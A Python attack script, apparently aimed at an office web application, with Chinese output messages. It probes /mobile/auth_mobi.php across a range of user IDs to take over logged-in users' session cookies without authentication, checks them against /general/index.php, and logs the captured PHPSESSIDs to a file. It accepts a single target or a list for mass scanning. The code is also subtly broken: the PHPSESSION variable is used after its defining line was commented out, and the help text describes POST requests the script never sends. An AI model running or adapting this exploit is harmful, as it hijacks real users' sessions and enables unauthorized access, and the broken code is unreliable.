import time
import argparse
import requests
import urllib3
import threading
import sys
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def send_post_request(url,user):
    try:
        urlone = url + "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
        resp1 = requests.get(urlone,timeout=3)
        if '未授权访问，请重新登录' in resp1.text:
            print(f"{url} 不存在漏洞")
        else:
            for i in range(1,int(user)+1):
                urlnew = url + "/mobile/auth_mobi.php?isAvatar=1&uid="+str(i)+"&P_VER=0"
                resp2 = requests.get(urlnew,timeout=3)
                if 'RELOGIN' in resp2.text:
                    print(f"{urlnew} 当前用户未登录，获取cookie失败")
                else:
                    set_cookie = resp2.headers.get('set-cookie')
    
                # 构建 headers
                    headers = {'cookie': set_cookie} if set_cookie else {}
    
                # 发送第二个请求
                    second_url = url + '/general/index.php'
                    second_resp = requests.get(second_url, headers=headers,timeout=3)
          
                # PHPSESSION = re.findall(r'PHPSESSID=(.*?);', str(second_resp.headers))
		# print('uid='+str(i)+"在线"+"对应的COOKIE值是：PHPSESSID="+str(PHPSESSION[0]))
                    output = url + 'uid=' + str(i) + "在线" + "对应的COOKIE值是：PHPSESSID=" + str(PHPSESSION[0])
                    print(output)
                    with open('output.txt','a')as f:
                        f.write(output)
                        f.close()
                    break
    except:
        print(url + '网络不通')



def main():
    parser = argparse.ArgumentParser(description='Send POST request to a URL and process the response')
    parser.add_argument('-u', '--url', help='URL to send the POST request to')
    parser.add_argument('-f', '--file', help='Path to the file containing target URLs')
    parser.add_argument('-s', '--user', help='User number')
    args = parser.parse_args()

    if not args.url and not args.file:
        print("Please provide a valid URL using the -u option or a file with target URLs using the -f option")
        return

    if args.url:
        if args.user:
            response = send_post_request(args.url,args.user)
        else:
            response = send_post_request(args.url,str(1))
    elif args.file:
        if args.user:
            with open(args.file, 'r') as file:
                urls = file.readlines()

            for url in urls:
                url = url.strip()
                response = send_post_request(url,args.user)
        else:
            with open(args.file, 'r') as file:
                urls = file.readlines()

            for url in urls:
                url = url.strip()
                response = send_post_request(url,str(1))


if __name__ == "__main__":
    main()

